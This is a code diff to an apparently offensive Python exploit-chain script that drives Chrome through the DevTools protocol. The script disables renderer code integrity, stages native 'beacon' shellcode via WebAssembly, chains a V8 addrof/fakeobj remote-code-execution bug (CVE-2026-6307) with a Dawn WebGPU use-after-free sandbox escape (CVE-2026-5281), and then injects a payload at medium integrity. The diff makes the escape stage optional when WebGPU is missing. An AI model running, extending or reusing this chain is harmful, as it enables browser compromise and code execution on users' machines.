@@ -452,7 +452,9 @@ def main():
         "--remote-debugging-port=9222",
         "--remote-allow-origins=*",
         "--disable-features=RendererCodeIntegrity",
-        "--enable-features=WebGPU",
+        "--enable-features=WebGPU,Vulkan",
+        "--enable-unsafe-webgpu",
+        "--use-webgpu-adapter=swiftshader",
         "about:blank",
     ]
     if args.no_sandbox:
@@ -560,9 +562,9 @@ def main():
             ]);
             var wasmMod = new WebAssembly.Module(wasmCode);
             var wasmInst = new WebAssembly.Instance(wasmMod);
-            var wasmMain = wasmInst.exports.main;
-            KEEP.push(wasmMod, wasmInst, wasmMain);
-            resolve(wasmMain().toString());
+            window.wasmMain = wasmInst.exports.main;
+            KEEP.push(wasmMod, wasmInst, window.wasmMain);
+            resolve(window.wasmMain().toString());
         """, timeout=30)
         if err or val != '42':
             print(f"[!] WASM setup failed: {err} (got {val})")
@@ -597,7 +599,7 @@ def main():
         print(f"[+] Beacon staged at {sc_addr:#018x}, JMP patched")
 
         # Trigger beacon
-        val, err = cdp.js_async("resolve(wasmMain().toString())", timeout=30)
+        val, err = cdp.js_async("resolve(window.wasmMain().toString())", timeout=30)
         if err:
             print(f"[!] wasmMain() error: {err}")
         else:
@@ -629,6 +631,7 @@ def main():
     # ═════════════════════════════════════════════════════════════════════════
     # Stage 4: WebGPU Availability Check
     # ═════════════════════════════════════════════════════════════════════════
+    webgpu_available = False
     if args.stage <= 4:
         print(f"\n{'='*72}")
         print("  Stage 4: WebGPU Availability Check")
@@ -636,35 +639,43 @@ def main():
 
         val, err = cdp.js_async("""
             var r = {gpu: !!navigator.gpu};
-            if (r.gpu) {
-                var a = await navigator.gpu.requestAdapter({
-                    powerPreference: 'high-performance'
-                });
+            if (!r.gpu) { resolve(JSON.stringify(r)); return; }
+            navigator.gpu.requestAdapter({
+                powerPreference: 'high-performance'
+            }).then(function(a) {
                 r.adapter = !!a;
-                if (a) {
-                    r.name = a.name;
-                    r.vendor = a.vendor || 'unknown';
-                    var d = await a.requestDevice();
+                if (!a) { resolve(JSON.stringify(r)); return; }
+                r.name = a.name;
+                r.vendor = a.vendor || 'unknown';
+                a.requestDevice().then(function(d) {
                     r.device = !!d;
                     if (d) d.destroy();
-                }
-            }
-            resolve(JSON.stringify(r));
+                    resolve(JSON.stringify(r));
+                }).catch(function(e) {
+                    r.deviceError = e.message;
+                    resolve(JSON.stringify(r));
+                });
+            }).catch(function(e) {
+                r.adapterError = e.message;
+                resolve(JSON.stringify(r));
+            });
         """, timeout=30)
 
         gpu = json.loads(val) if val else {}
-        if not gpu.get('device'):
-            print(f"[!] WebGPU not available: {gpu}")
-            print("    Chrome must be launched with --enable-features=WebGPU")
-            print("    GPU must support D3D12 (Windows) or Vulkan")
-            cdp.close(); proc.terminate(); sys.exit(1)
-        print(f"[+] WebGPU adapter: {gpu.get('name', '?')} ({gpu.get('vendor', '?')})")
-        print(f"[+] Device creation: OK")
+        webgpu_available = gpu.get('device', False)
+        if not webgpu_available:
+            print(f"[*] WebGPU not available: {gpu}")
+            print("    Dawn UAF (Stage 5) will be skipped")
+            print("    Proceeding with orchestrator injection (Stage 6)")
+        else:
+            print(f"[+] WebGPU adapter: {gpu.get('name', '?')} ({gpu.get('vendor', '?')})")
+            print(f"[+] Device creation: OK")
 
     # ═════════════════════════════════════════════════════════════════════════
     # Stage 5: CVE-2026-5281 Dawn WebGPU UAF — Sandbox Escape
     # ═════════════════════════════════════════════════════════════════════════
-    if args.stage <= 5:
+    dawn_success = False
+    if args.stage <= 5 and webgpu_available:
         print(f"\n{'='*72}")
         print("  Stage 5: CVE-2026-5281 Dawn WebGPU UAF — Sandbox Escape")
         print(f"{'='*72}")
@@ -814,8 +825,8 @@ def main():
     print(f"    Stage 1 (V8 RCE):       CVE-2026-6307 FrameState CSE addrof/fakeobj")
     print(f"    Stage 2 (Heap layout):   Renderer PID {renderer_pid if 'renderer_pid' in locals() else '?'}")
     print(f"    Stage 3 (Beacon):        Native code exec in renderer")
-    print(f"    Stage 4 (WebGPU):        Adapter available")
-    print(f"    Stage 5 (Dawn UAF):      CVE-2026-5281 sandbox escape trigger")
+    print(f"    Stage 4 (WebGPU):        {'Available' if webgpu_available else 'Not available (skipped Dawn UAF)'}")
+    print(f"    Stage 5 (Dawn UAF):      {'Triggered' if dawn_success else 'Skipped' if not webgpu_available else 'Not triggered'}")
     print(f"    Stage 6 (Injection):     {payload_str} at MEDIUM IL")
     print(f"    Stage 7 (Verify):        {'FOUND' if found else 'NOT DETECTED'}")
     print(f"{'='*72}")
